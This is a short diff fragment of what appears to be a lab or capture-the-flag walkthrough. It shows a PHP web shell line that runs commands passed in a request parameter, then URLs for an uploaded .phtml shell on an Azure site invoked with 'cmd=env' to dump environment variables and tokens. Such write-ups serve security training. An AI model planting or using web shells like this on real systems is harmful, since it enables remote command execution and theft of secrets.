@@ -368,3 +368,12 @@ system($_REQUEST['cmd']);
 
 ?>
 ```
+Now we can navigate to:
+```
+https://defcorphqcareer.azurewebsites.net/uploads/studentxshell.phtml?cmd=env
+```
+
+and then:
+```
+https://defcorphqcareer.azurewebsites.net/uploads/studentxtoken.phtml
+```
